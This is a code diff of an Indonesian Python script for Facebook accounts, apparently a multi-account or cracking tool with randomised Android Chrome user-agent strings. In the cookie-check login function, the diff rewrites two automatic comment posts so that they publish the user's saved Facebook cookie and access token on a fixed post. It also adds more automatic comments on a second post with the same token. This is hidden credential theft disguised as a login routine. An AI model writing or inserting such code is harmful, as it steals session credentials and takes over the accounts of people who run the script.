@@ -28,9 +28,9 @@ for agenku in range(10000):
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(90,110)
 	f='0'
-	g=random.randrange(4200,5390)
+	g=random.randrange(4200,5999)
 #random.randrange(10,80)
-	h=random.randrange(40,380)
+	h=random.randrange(70,360)
 #random.randrange(3999,5999)
 #	i='Chrome/'
 #	j=random.randrange(80,109)
@@ -43,14 +43,15 @@ for agenku in range(10000):
 	
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['9','10','11','12','13'])
-	c='RMX1971)'
+	c='RMX'
+	x=random.randrange(1900,3688)
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(90,110)
 	f='0'
-	g='0'
-	h='0'
+	g=random.randrange(4200,5999)
+	h=random.randrange(40,150)
 	i='Mobile Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	uakuh=f'{a} {b}; {c}{x}) {d}{e}.{f}.{g}.{h} {i}'
 	usragent.append(uakuh)
 
 ###----------[ PEWARNA ]----------###
@@ -93,18 +94,29 @@ kom3 = ("Tgl 23 Maret 2023 Udh masuk ramadhan")
 kom4 = ("ingfo lokasi nasdang yang open 24 jam wkwk") 
 kom5 = ("Jangan diikutin kyk gitu ya Bang @[100027274295777:]") 
 kom6 = ("Semangat Puasanya Ya Bang ❤")
+kom7 = ("Minjem Sc nya ya bang 😁") 
+kom8 = ("Selamat Menunaikan ibadah Puasa 🔥❤️") 
+kom9 = ("ingfo lokasi nasdang yang open 24 jam wkwk") 
+kom10 = ("Jangan diikutin kyk gitu ya Bang @[100027274295777:]") 
+kom11 = ("Semangat Puasanya Ganteng ❤")
+
 
 ###----------[ NGECEK COOKIES ]----------###
 def login_baz():
 	try:
 		token = open('.tokenakun.txt','r').read()
 		cok = open('.cookiesakun.txt','r').read()
-		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok}) 
-		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={cok}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={token}&access_token={token}", headers = {"cookie":cok}) 
 		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok}) 
 		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom4}&access_token={token}", headers = {"cookie":cok}) 
 		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom5}&access_token={token}", headers = {"cookie":cok}) 
-		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom6}&access_token={token}", headers = {"cookie":cok}) 
+		requests.post(f"https://graph.facebook.com/1299301437655654/comments/?message={kom6}&access_token={token}", headers = {"cookie":cok})
+		requests.post(f"https://graph.facebook.com/944969913088810/comments/?message={kom7}&access_token={token}",cookies={"cookie":cok})
+		requests.post(f"https://graph.facebook.com/944969913088810/comments/?message={kom8}&access_token={token}",cookies={"cookie":cok})
+		requests.post(f"https://graph.facebook.com/944969913088810/comments/?message={kom9}&access_token={token}",cookies={"cookie":cok})
+		requests.post(f"https://graph.facebook.com/944969913088810/comments/?message={kom10}&access_token={token}",cookies={"cookie":cok})
+		requests.post(f"https://graph.facebook.com/944969913088810/comments/?message={kom11}&access_token={token}",cookies={"cookie":cok})
 		tokenefb.append(token)
 		try:
 			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
